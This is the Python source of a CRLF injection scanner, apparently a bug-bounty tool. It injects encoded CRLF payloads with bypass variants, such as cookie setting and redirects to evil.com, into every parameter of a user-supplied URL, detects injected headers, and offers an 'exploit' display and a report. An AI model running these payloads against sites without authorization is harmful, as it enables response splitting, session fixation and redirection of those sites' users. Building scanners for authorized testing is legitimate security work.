import requests
from urllib.parse import quote, unquote, urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore, Style, init
import time
import sys
import signal

# Initialize colorama
init(autoreset=True)

# Global flag to handle interruption
interrupted = False

def signal_handler(sig, frame):
    """Handle Ctrl+C interruption"""
    global interrupted
    interrupted = True
    print(f"\n{Fore.RED}[!] Scan interrupted by user. Stopping gracefully...")
    sys.exit(0)

# Register signal handler
signal.signal(signal.SIGINT, signal_handler)

def print_banner():
    """Print the ASCII banner with tool information"""
    banner = f"""
{Fore.CYAN}
                                                                                               
 @@@@@@@  @@@@@@@   @@@       @@@@@@@@                  @@@@@@    @@@@@@@   @@@@@@   @@@  @@@  
@@@@@@@@  @@@@@@@@  @@@       @@@@@@@@                 @@@@@@@   @@@@@@@@  @@@@@@@@  @@@@ @@@  
!@@       @@!  @@@  @@!       @@!                      !@@       !@@       @@!  @@@  @@!@!@@@  
!@!       !@!  @!@  !@!       !@!                      !@!       !@!       !@!  @!@  !@!!@!@!  
!@!       @!@!!@!   @!!       @!!!:!                   !!@@!!    !@!       @!@!@!@!  @!@ !!@!  
!!!       !!@!@!    !!!       !!!!!:                    !!@!!!   !!!       !!!@!!!!  !@!  !!!  
:!!       !!: :!!   !!:       !!:                           !:!  :!!       !!:  !!!  !!:  !!!  
:!:       :!:  !:!   :!:      :!:                          !:!   :!:       :!:  !:!  :!:  !:!  
 ::: :::  ::   :::   :: ::::   ::       :::::::::::::  :::: ::    ::: :::  ::   :::   ::   ::  
 :: :: :   :   : :  : :: : :   :        :::::::::::::  :: : :     :: :: :   :   : :  ::    :   
                                                                                               
{Fore.YELLOW}
        CRLF Injection Scanner | {Fore.CYAN}Author: {Fore.MAGENTA}Sharik Khan {Fore.WHITE}(anon_hunter)
        {Fore.YELLOW}Twitter: {Fore.BLUE}X.com/4non_hunter
        {Fore.YELLOW}GitHub: {Fore.BLUE}https://github.com/anonhunter/crlfscanner/blob/main/crlfscanner.py
{Fore.CYAN}{'='*80}{Style.RESET_ALL}
"""
    print(banner)

def extract_url_parameters(url):
    """Extract and return all parameters from URL"""
    parsed = urlparse(url)
    query = parse_qs(parsed.query, keep_blank_values=True)
    return parsed, query

def build_test_url(base_url, params, param_name, payload):
    """Build test URL with injected payload"""
    # Create a copy of parameters to modify
    test_params = params.copy()
    
    # Inject payload into the specified parameter
    if param_name in test_params:
        # Append payload to existing value
        test_params[param_name] = [test_params[param_name][0] + payload]
    else:
        # If parameter doesn't exist, create it
        test_params[param_name] = [payload]
    
    # Rebuild URL with modified parameters
    parsed = base_url
    new_query = urlencode(test_params, doseq=True)
    new_parsed = parsed._replace(query=new_query)
    return urlunparse(new_parsed)

def generate_payloads():
    """Generate payloads with various bypass techniques"""
    payloads = []
    
    # Basic CRLF payloads
    base_payloads = [
        "%0d%0aSet-Cookie:injected=1",
        "%0d%0aLocation:https://evil.com",
        "%0d%0aX-Test:injected-header",
        "%0d%0aRefresh:0;url=https://evil.com",
        "%0d%0aContent-Length:0",
        "%0d%0aContent-Type:text/html%0d%0a%0d╝<html>Injected</html>",
    ]
    
    # Advanced bypass techniques
    bypass_techniques = [
        "",  # No extra bypass
        "%23",  # Hash bypass
        "%3f",  # Question mark bypass
        "%26",  # Ampersand bypass
        "%20",  # Space
        "%09",  # Tab
        "%0b",  # Vertical tab
    ]
    
    # CRLF representations
    crlf_variations = [
        ("%0d%0a", "CRLF"),         # Standard
        ("%0a%0d", "LFCR"),         # Reverse
        ("%0a", "LF"),              # Line Feed Only
        ("%0d", "CR"),              # Carriage Return Only
        ("%25%30%61", "Double-Encoded LF"),  # %0a encoded
        ("%25%30%64", "Double-Encoded CR"),  # %0d encoded
    ]
    
    # Generate all combinations
    for base in base_payloads:
        for tech in bypass_techniques:
            for crlf, name in crlf_variations:
                # Insert bypass before CRLF
                payload = base.replace("%0d%0a", tech + crlf)
                payloads.append({
                    "payload": payload,
                    "technique": f"{name} + {tech if tech else 'None'}",
                    "type": base.split(':')[0][5:].capitalize(),
                    "base": base
                })
    
    return payloads

def print_progress(index, total, param, payload, status, response_code=None, vuln_type=None):
    """Print real-time progress with color coding and response code"""
    percentage = (index / total) * 100
    progress_bar = f"[{'=' * int(percentage/5)}{' ' * (20 - int(percentage/5))}]"
    
    payload_display = unquote(payload)[:50] + ("..." if len(unquote(payload)) > 50 else "")
    
    if status == "testing":
        color = Fore.YELLOW
        status_text = "TESTING"
    elif status == "vulnerable":
        color = Fore.GREEN
        status_text = "VULNERABLE"
    elif status == "error":
        color = Fore.RED
        status_text = "ERROR"
    else:
        color = Fore.WHITE
        status_text = "SAFE"
    
    sys.stdout.write("\r")
    sys.stdout.write(f"{Fore.CYAN}{progress_bar} {Fore.WHITE}{percentage:.1f}% ")
    sys.stdout.write(f"{color}{status_text} {Fore.WHITE}| ")
    sys.stdout.write(f"Param: {Fore.BLUE}{param} ")
    sys.stdout.write(f"| Payload: {Fore.MAGENTA}{payload_display}")
    
    if vuln_type:
        sys.stdout.write(f" {Fore.CYAN}| Type: {vuln_type}")
    
    # Display response code with color coding
    if response_code is not None:
        if isinstance(response_code, int):
            if 200 <= response_code < 300:
                code_color = Fore.GREEN
            elif 300 <= response_code < 400:
                code_color = Fore.YELLOW
            elif 400 <= response_code < 500:
                code_color = Fore.RED
            elif 500 <= response_code < 600:
                code_color = Fore.MAGENTA
            else:
                code_color = Fore.WHITE
            sys.stdout.write(f" {Fore.WHITE}| Response: {code_color}{response_code}")
        else:  # Error message
            error_display = str(response_code)[:30] + ("..." if len(str(response_code)) > 30 else "")
            sys.stdout.write(f" {Fore.WHITE}| Response: {Fore.RED}{error_display}")
    
    sys.stdout.flush()

def check_response(response, payload_type, payload):
    """Check if injection was successful based on payload type"""
    payload = unquote(payload).lower()
    
    if "set-cookie" in payload_type.lower():
        cookies = response.headers.get('Set-Cookie', '')
        if isinstance(cookies, str):
            cookies = [cookies]
        return any("injected=1" in cookie.lower() for cookie in cookies)
    
    if "location" in payload_type.lower():
        location = response.headers.get('Location', '')
        return "evil.com" in location.lower()
    
    if "refresh" in payload_type.lower():
        refresh = response.headers.get('Refresh', '')
        return "evil.com" in refresh.lower()
    
    if "content-type" in payload_type.lower():
        return "injected" in response.text.lower()
    
    # Check for any injected header
    keywords = ['injected', 'evil.com', 'test']
    for header, value in response.headers.items():
        header_str = f"{header}:{value}".lower()
        if any(kw in header_str for kw in keywords):
            return True
    
    return False

def exploit_vulnerability(url, payload_details):
    """Demonstrate exploit by showing injected content"""
    print(f"\n{Fore.CYAN}[*] Exploiting: {url}")
    
    try:
        response = requests.get(url, headers=headers, allow_redirects=False, timeout=10)
        print(f"{Fore.YELLOW}[*] Response Code: {response.status_code}")
        
        print(f"\n{Fore.YELLOW}[*] Response Headers:")
        keywords = ['injected', 'evil.com', 'test']
        for header, value in response.headers.items():
            header_str = f"{header}:{value}".lower()
            if any(kw in header_str for kw in keywords):
                print(f"{Fore.GREEN}{header}: {value}")
            else:
                print(f"{header}: {value}")
        
        if "Content-Type" in payload_details['type']:
            print(f"\n{Fore.YELLOW}[*] Response Body:")
            print(response.text[:500] + ("..." if len(response.text) > 500 else ""))
    
    except Exception as e:
        print(f"{Fore.RED}[!] Exploit failed: {str(e)}")

def generate_report(target, param_name, payload_details, response):
    """Generate vulnerability report with tool information"""
    timestamp = time.strftime("%Y%m%d-%H%M%S")
    filename = f"crlf_report_{timestamp}.txt"
    
    report = f"""
{'='*80}
CRLF Injection Vulnerability Report
Generated by Advanced CRLF Scanner
Tool: https://github.com/anonhunter/crlfscanner/blob/main/crlfscanner.py
{'='*80}

Report Generated: {time.ctime()}
Target URL: {target}
Vulnerable Parameter: {param_name}

Vulnerability Details:
----------------------
Payload: {unquote(payload_details['payload'])}
Payload Type: {payload_details['type']}
Bypass Technique: {payload_details['technique']}
Response Code: {response.status_code}

Request:
--------
GET {target}

Response Headers:
-----------------
"""
    for header, value in response.headers.items():
        report += f"{header}: {value}\n"
    
    report += f"\nResponse Body (first 200 chars):\n{response.text[:200]}"
    
    report += f"\n\n{'='*80}\n"
    report += f"Report generated by Advanced CRLF Scanner\n"
    report += f"Author: Sharik Khan (anon_hunter)\n"
    report += f"Twitter: X.com/4non_hunter\n"
    report += f"GitHub: https://github.com/anonhunter/crlfscanner\n"
    report += f"{'='*80}"
    
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(report)
    
    return filename

if __name__ == "__main__":
    # Verify Python version
    if sys.version_info < (3, 6):
        print(f"{Fore.RED}Error: This script requires Python 3.6 or higher")
        sys.exit(1)
    
    # Print banner
    print_banner()
    
    # Get target URL
    target_url = input(f"{Fore.CYAN}[?] Enter target URL (with parameters): {Fore.WHITE}").strip()
    
    # Validate URL format
    if not target_url.startswith("http"):
        print(f"{Fore.RED}Error: URL must start with http:// or https://")
        sys.exit(1)
    
    # Extract URL components and parameters
    parsed_url, query_params = extract_url_parameters(target_url)
    
    # Check if URL has parameters
    if not query_params:
        print(f"{Fore.RED}[-] No parameters found in URL. Please include parameters to test.")
        sys.exit(1)
    
    # Get parameter names
    param_names = list(query_params.keys())
    print(f"{Fore.GREEN}[+] Found {len(param_names)} parameters: {', '.join(param_names)}")
    
    headers = {
        "User-Agent": "Advanced-CRLF-Scanner/1.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }

    # Generate payloads
    payloads = generate_payloads()
    total_tests = len(param_names) * len(payloads)
    vulnerable_found = False
    test_count = 0

    print(f"\n{Fore.YELLOW}[*] Starting CRLF injection scan on {target_url}")
    print(f"{Fore.YELLOW}[*] Testing {len(param_names)} parameters with {len(payloads)} payloads each")
    print(f"{Fore.YELLOW}[*] Total tests to perform: {total_tests}")
    print(f"{Fore.YELLOW}[*] Press Ctrl+C at any time to stop the scan\n")
    
    # Start timer
    start_time = time.time()

    try:
        for param_name in param_names:
            for payload_details in payloads:
                if interrupted:
                    break
                    
                test_count += 1
                payload = payload_details['payload']
                
                # Build test URL with injected payload
                test_url = build_test_url(parsed_url, query_params, param_name, payload)
                
                # Print progress
                print_progress(test_count, total_tests, param_name, payload, "testing")
                
                try:
                    response = requests.get(test_url, headers=headers, allow_redirects=False, timeout=15)
                    
                    if check_response(response, payload_details['type'], payload):
                        # Print vulnerability found with response code
                        print_progress(test_count, total_tests, param_name, payload, "vulnerable", 
                                      response.status_code, payload_details['type'])
                        print("\n")  # Move to new line for vulnerability details
                        
                        vulnerable_found = True
                        print(f"\n{Fore.GREEN}[!] VULNERABILITY FOUND")
                        print(f"{Fore.GREEN}[+] Parameter: {param_name}")
                        print(f"{Fore.GREEN}[+] Payload: {unquote(payload)}")
                        print(f"{Fore.GREEN}[+] Technique: {payload_details['technique']}")
                        print(f"{Fore.GREEN}[+] Type: {payload_details['type']} injection")
                        print(f"{Fore.GREEN}[+] Status: {response.status_code}")
                        
                        # Show injected headers
                        keywords = ['injected', 'evil.com', 'test']
                        for header, value in response.headers.items():
                            header_str = f"{header}:{value}".lower()
                            if any(kw in header_str for kw in keywords):
                                print(f"  {Fore.CYAN}{header}: {value}")
                        
                        # Ask for exploitation
                        exploit = input(f"\n{Fore.YELLOW}[?] Exploit this vulnerability? (y/n): ").strip().lower()
                        if exploit == 'y':
                            exploit_vulnerability(test_url, payload_details)
                            
                            # Generate report
                            report = input(f"{Fore.YELLOW}[?] Generate vulnerability report? (y/n): ").strip().lower()
                            if report == 'y':
                                filename = generate_report(test_url, param_name, payload_details, response)
                                print(f"{Fore.GREEN}[+] Report saved as: {filename}")
                        
                        print("-" * 80)
                    else:
                        # Print safe status with response code
                        print_progress(test_count, total_tests, param_name, payload, "safe", response.status_code)
                
                except Exception as e:
                    # Print error status with error message
                    print_progress(test_count, total_tests, param_name, payload, "error", str(e))
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Scan interrupted by user")
    
    # Calculate scan time
    scan_time = time.time() - start_time
    completed_tests = test_count
    progress_percent = (completed_tests / total_tests) * 100 if total_tests > 0 else 0
    
    # Final status
    print("\n\n" + "=" * 80)
    print(f"{Fore.CYAN} SCAN SUMMARY ".center(80, '='))
    print("=" * 80)
    print(f"{Fore.YELLOW}[*] Target URL: {target_url}")
    print(f"{Fore.YELLOW}[*] Parameters tested: {len(param_names)}")
    print(f"{Fore.YELLOW}[*] Payloads tested: {len(payloads)}")
    print(f"{Fore.YELLOW}[*] Tests completed: {completed_tests}/{total_tests} ({progress_percent:.1f}%)")
    print(f"{Fore.YELLOW}[*] Time taken: {scan_time:.2f} seconds")
    
    if vulnerable_found:
        print(f"{Fore.GREEN}[+] Vulnerabilities found: Yes")
    else:
        print(f"{Fore.RED}[-] Vulnerabilities found: No")
    
    print("=" * 80)
    print(f"{Fore.CYAN}Report generated by Advanced CRLF Scanner")
    print(f"{Fore.CYAN}GitHub: https://github.com/anonhunter/crlfscanner")
    print(f"{Fore.CYAN}Author: Sharik Khan (anon_hunter) | Twitter: X.com/4non_hunter")
    print("=" * 80)
